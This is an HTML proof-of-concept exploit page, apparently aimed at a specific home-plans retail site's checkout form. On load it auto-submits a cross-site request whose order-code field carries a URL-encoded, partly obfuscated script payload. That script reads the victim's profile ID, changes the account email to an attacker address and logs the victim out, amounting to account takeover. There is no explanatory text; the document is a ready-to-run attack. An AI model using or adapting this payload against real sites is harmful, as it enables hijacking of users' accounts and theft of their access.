<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC â€“ Change Order Code</title>
</head>
<body>
  <form id="csrfForm" action="https://www.familyhomeplans.com/checkout/review.cfm" method="POST">
    <!-- These hidden inputs replicate exactly what the legitimate form sends -->
    <input id="OrderCode" type="hidden" name="OrderCode"   value="">
    <input type="hidden" name="PromoCode"   value="">
    <input type="hidden" name="saveordercode" value="1">
  </form>

  <script>
const encoded="%22%3E%3Csvg%20visibility%3D%22hidden%22%20onload%3D%22%28async%28%29%3D%3E%7Bconst%20r%3Dawait%20fetch%28%27%2Fmypage%2Ecfm%3Ftab%3D2%27%2C%7Bcredentials%3A%27include%27%7D%29%2Ch%3Dawait%20r%2Etext%28%29%2Cparser%3Ddocument%2EcreateElement%28%27div%27%29%3Bparser%2EinnerHTML%3Dh%3Bconst%20f%3Dparser%2EquerySelector%28%27%5Bname%3D%26quot%3BID%26quot%3B%5D%27%29%3Bif%28%21f%29return%3Bconst%20i%3Df%2Evalue%2Cfd%3Dnew%20URLSearchParams%28%29%3Bfd%2Eset%28%27Notes%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Ffirst%5Fname%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Flast%5Fname%27%2C%27%27%29%3Bfd%2Eset%28%27t%5Fcompany%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Faddress%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fcity%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fstate%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fzip%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fcountry%27%2C%27US%27%29%3Bfd%2Eset%28%27x%5Fphone%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Femail%27%2C%27hacked%40mail%2Ecom%27%29%3Bfd%2Eset%28%27x%5Fship%5Fto%5Ffirst%5Fname%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fship%5Fto%5Flast%5Fname%27%2C%27%27%29%3Bfd%2Eset%28%27t%5Fship%5Fto%5Fcompany%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fship%5Fto%5Faddress%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fship%5Fto%5Fcity%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fship%5Fto%5Fstate%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fship%5Fto%5Fzip%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Fship%5Fto%5Fcountry%27%2C%27US%27%29%3Bfd%2Eset%28%27x%5Fship%5Fto%5Fphone%27%2C%27%27%29%3Bfd%2Eset%28%27x%5Foccupation%27%2C%271%27%29%3Bfd%2Eset%28%27license%5Fnum%27%2C%27%27%29%3Bfd%2Eset%28%27saveprofile%27%2C%271%27%29%3Bfd%2Eset%28%27ID%27%2Ci%29%3Bfd%2Eset%28%27t%5Fx%5Femail%27%2C%27hacked%40mail%2Ecom%27%29%3Bfd%2Eset%28%27enter%5Fbutton%27%2C%27Save%20Address%20Info%27%29%3Bawait%20fetch%28%27%2Fedit%5Fmypage%2Ecfm%27%2C%7Bmethod%3AString%2EfromCharCode%2880%2C79%2C83%2C84%29%2Ccredentials%3A%27include%27%2Cheaders%3A%7B%27Content%2DType%27%3A%27application%2Fx%2Dwww%2Dform%2Durlencoded%27%7D%2Cbody%3Afd%2EtoString%28%29%7D%29%3Bawait%20fetch%28%27%2Flogout%2Ecfm%27%2C%7Bmethod%3A%27GET%27%2Ccredentials%3A%27include%27%7D%29%3Bconsole%2Elog%28%27CSRF%20and%20logout%20sent%27%29%3B%7D%29%28%29%22%3E%3C%2Fsvg%3E%0A";
    const payload = decodeURIComponent(encoded);
    document.getElementById('OrderCode').value = payload;
    // Immediately submit when the page loads
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
